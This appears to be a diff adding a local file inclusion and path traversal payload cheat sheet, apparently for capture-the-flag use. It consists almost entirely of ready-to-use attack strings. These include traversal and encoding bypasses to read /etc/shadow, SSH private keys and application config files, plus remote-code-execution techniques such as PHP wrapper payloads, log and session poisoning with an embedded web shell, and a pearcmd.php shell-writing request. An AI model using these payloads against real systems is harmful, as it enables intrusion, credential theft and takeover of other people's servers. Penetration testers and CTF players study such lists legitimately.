@@ -1,0 +1,359 @@
+=== BASIC LINUX PATH TRAVERSAL ===
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/group
+/etc/issue
+/etc/hostname
+/proc/version
+/proc/self/environ
+/proc/self/cmdline
+
+=== BASIC TRAVERSAL WITH RELATIVE PATHS ===
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+=== WINDOWS PATH TRAVERSAL ===
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
+C:\boot.ini
+..\..\..\..\Windows\System32\drivers\etc\hosts
+../../../../Windows/System32/drivers/etc/hosts
+\\localhost\c$\windows\win.ini
+
+=== NULL BYTE BYPASS (PHP < 5.3.4) ===
+../../../../etc/passwd%00
+../../../../etc/passwd%00.jpg
+../../../../etc/passwd%00.png
+../../../../etc/passwd\x00.txt
+
+=== URL ENCODING BYPASS ===
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+=== DOUBLE SLASH BYPASS ===
+....//....//....//etc/passwd
+..../\..../\..../\etc/passwd
+....\/....\/....\/etc/passwd
+
+=== UNICODE BYPASS ===
+..%c0%af
+..%c1%9c
+..%e0%80%af
+
+=== ABSOLUTE PATH ===
+file:///etc/passwd
+/etc/passwd
+C:/Windows/win.ini
+
+=== PHP FILTER - READ SOURCE CODE ===
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=admin.php
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/read=string.rot13/resource=index.php
+php://filter/read=string.toupper/resource=config.php
+
+=== PHP INPUT WRAPPER (RCE) ===
+# POST Request
+php://input
+# Body: <?php system('id'); ?>
+
+# With command parameter
+php://input&cmd=id
+# Body: <?php system($_GET['cmd']); ?>
+
+=== DATA WRAPPER (RCE) ===
+data://text/plain,<?php system('id'); ?>
+data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
+
+=== EXPECT WRAPPER (RCE - rare) ===
+expect://id
+expect://whoami
+expect://cat /etc/passwd
+expect://cat /flag.txt
+
+=== ZIP WRAPPER ===
+zip://uploads/file.zip%23shell.php
+zip://uploads/image.jpg%23shell.php&cmd=id
+phar://uploads/file.phar/shell.php
+phar://uploads/archive.phar/shell.php&cmd=id
+
+=== APACHE/NGINX LOG FILES ===
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/apache/access.log
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/usr/local/apache/logs/access_log
+/usr/local/apache2/logs/access_log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+
+=== LOG POISONING (RCE) ===
+# Step 1: Poison log with User-Agent
+User-Agent: <?php system($_GET['cmd']); ?>
+
+# Step 2: Include log
+?page=/var/log/apache2/access.log&cmd=id
+?page=/var/log/nginx/access.log&cmd=whoami
+?page=/var/log/apache2/access.log&cmd=cat /flag.txt
+
+=== SSH AUTH LOG POISONING ===
+# Step 1: SSH with PHP code as username
+ssh '<?php system($_GET["cmd"]); ?>'@target.com
+
+# Step 2: Include auth log
+?page=/var/log/auth.log&cmd=id
+?page=/var/log/secure&cmd=cat /flag.txt
+
+=== PHP SESSION FILES ===
+/var/lib/php/sessions/sess_[SESSION_ID]
+/var/lib/php5/sessions/sess_[SESSION_ID]
+/tmp/sess_[SESSION_ID]
+/tmp/sessions/sess_[SESSION_ID]
+
+=== SESSION POISONING (RCE) ===
+# Step 1: Poison session (e.g., via username field)
+username=<?php system($_GET['cmd']); ?>
+
+# Step 2: Include session file
+?page=/var/lib/php/sessions/sess_YOUR_SESSION_ID&cmd=id
+
+=== PROC FILESYSTEM ===
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+/proc/self/fd/3
+/proc/version
+/proc/net/tcp
+/proc/net/fib_trie
+
+=== WEB APPLICATION CONFIG FILES ===
+/var/www/html/.env
+/var/www/html/config.php
+/var/www/html/wp-config.php
+/var/www/html/configuration.php
+/var/www/html/settings.php
+/var/www/html/database.yml
+/var/www/html/db.php
+/var/www/html/.git/config
+/var/www/html/.htaccess
+
+=== APACHE CONFIG ===
+/etc/apache2/apache2.conf
+/etc/apache2/sites-enabled/000-default.conf
+/etc/apache2/sites-available/default
+/usr/local/apache2/conf/httpd.conf
+/etc/httpd/conf/httpd.conf
+
+=== NGINX CONFIG ===
+/etc/nginx/nginx.conf
+/etc/nginx/sites-enabled/default
+/etc/nginx/sites-available/default
+/usr/local/nginx/conf/nginx.conf
+
+=== PHP CONFIG ===
+/etc/php.ini
+/etc/php/7.4/apache2/php.ini
+/etc/php/8.0/fpm/php.ini
+/etc/php5/apache2/php.ini
+
+=== SSH KEYS ===
+/root/.ssh/id_rsa
+/root/.ssh/id_dsa
+/root/.ssh/authorized_keys
+/home/user/.ssh/id_rsa
+/home/user/.ssh/authorized_keys
+/home/ubuntu/.ssh/id_rsa
+
+=== DATABASE CONFIG ===
+/var/www/html/database.yml
+/var/www/html/db.php
+/etc/mysql/my.cnf
+/etc/my.cnf
+
+=== SYSTEM INFO FILES ===
+/etc/os-release
+/etc/issue
+/etc/motd
+/etc/hostname
+/proc/version
+/proc/cpuinfo
+/proc/meminfo
+
+=== CTF COMMON FLAG LOCATIONS ===
+/flag
+/flag.txt
+flag.txt
+/root/flag.txt
+/home/user/flag.txt
+/var/www/flag.txt
+/app/flag.txt
+../flag.txt
+../../flag.txt
+../../../flag.txt
+
+=== READ SOURCE CODE (PHP FILTER) ===
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=flag.php
+php://filter/convert.base64-encode/resource=admin.php
+php://filter/convert.base64-encode/resource=login.php
+php://filter/convert.base64-encode/resource=config.php
+
+=== MAIL LOGS ===
+/var/log/mail.log
+/var/mail/www-data
+/var/spool/mail/www-data
+/var/mail/root
+
+=== OTHER LOG FILES ===
+/var/log/auth.log
+/var/log/syslog
+/var/log/messages
+/var/log/secure
+/var/log/mysql/error.log
+/var/log/postgresql/postgresql.log
+
+=== COMMON UPLOAD DIRECTORIES ===
+uploads/
+upload/
+files/
+images/
+tmp/
+temp/
+/var/www/html/uploads/
+/var/www/html/files/
+
+=== FILE UPLOAD + LFI ===
+# After uploading shell.jpg
+?page=uploads/shell.jpg&cmd=id
+?page=../../../../var/www/html/uploads/shell.jpg&cmd=whoami
+
+=== PEARCMD.PHP (RCE) ===
+?page=/usr/local/lib/php/pearcmd.php&+config-create+/&file=/var/www/html/shell.php&/<?=system($_GET['cmd']);?>
+?page=/usr/share/php/pearcmd.php&+config-create+/&file=/tmp/shell.php&/<?=system($_GET['cmd']);?>
+
+=== ENVIRONMENT VARIABLES ===
+/proc/self/environ
+/proc/1/environ
+
+=== BYPASS STRATEGIES ===
+# If "../" is filtered
+....//
+....\/
+..;/
+
+# If ".." is filtered
+..%2f
+%2e%2e%2f
+..%252f
+
+# If "/" is filtered
+..%5c
+..\
+
+# If "etc" is filtered
+e%74c
+et%63
+e\x74c
+
+# If "passwd" is filtered
+pass%77d
+p%61sswd
+
+=== CASE VARIATION (Windows) ===
+c:\WiNdOwS\sYsTeM32\dRiVeRs\eTc\hOsTs
+C:\windows\SYSTEM32\drivers\ETC\hosts
+
+=== ALTERNATE DATA STREAMS (Windows) ===
+C:\Windows\System32\drivers\etc\hosts::$DATA
+file.txt::$DATA
+
+=== PATH TRUNCATION ===
+../../../../etc/passwd................................................................................................................................................................................................................................................................................................................................................................................................................................................................
+
+=== TESTING DIFFERENT DEPTHS ===
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+=== COMMON VULNERABLE PARAMETERS ===
+?file=
+?page=
+?document=
+?path=
+?folder=
+?pg=
+?style=
+?pdf=
+?template=
+?php_path=
+?doc=
+
+=== AUTOMATION PAYLOADS ===
+# Test with
+../../../../etc/passwd
+
+# If successful, enumerate
+../../../../etc/shadow
+../../../../etc/group
+../../../../etc/hosts
+../../../../proc/self/environ
+../../../../var/log/apache2/access.log
+
+=== BLIND LFI DETECTION ===
+# Time-based
+?page=/etc/passwd (fast response = exists)
+?page=/etc/nonexistent (slow/error = doesn't exist)
+
+=== COMBINING TECHNIQUES ===
+# LFI + Log Poisoning
+1. User-Agent: <?php system($_GET['cmd']); ?>
+2. ?page=../../../../var/log/apache2/access.log&cmd=cat /flag.txt
+
+# LFI + Session Poisoning
+1. Register with username: <?php system($_GET['cmd']); ?>
+2. ?page=../../../../var/lib/php/sessions/sess_[ID]&cmd=id
+
+# LFI + File Upload
+1. Upload: malicious.jpg (contains PHP)
+2. ?page=../../../../var/www/html/uploads/malicious.jpg&cmd=id
+
+# LFI + php://input
+1. POST to ?page=php://input
+2. Body: <?php system($_GET['cmd']); ?>
+3. Access: ?page=php://input&cmd=id
+
+=== QUICK CTF WORKFLOW ===
+# 1. Test basic LFI
+?page=../../../../etc/passwd
+
+# 2. Try to read flag
+?page=/flag.txt
+?page=../../../../flag.txt
+
+# 3. Read source code
+?page=php://filter/convert.base64-encode/resource=index.php
+
+# 4. Check for RCE opportunities
+?page=php://input (POST PHP code)
+?page=/var/log/apache2/access.log (after log poisoning)
+
+# 5. If found, execute
+?page=/var/log/apache2/access.log&cmd=cat /flag.txt
